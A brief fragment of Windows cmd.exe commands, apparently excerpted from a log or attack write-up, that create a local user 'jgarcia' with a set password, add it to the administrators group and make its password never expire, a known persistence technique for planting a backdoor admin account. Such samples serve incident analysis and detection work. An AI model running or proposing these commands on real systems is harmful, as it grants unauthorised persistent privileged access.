...
cmd.exe /c net user /add jgarcia Jaga2024$%
cmd.exe /c net localgroup administrators jgarcia /add
...
cmd.exe /c wmic useraccount where "name='jgarcia'" set PasswordExpires=FALSE
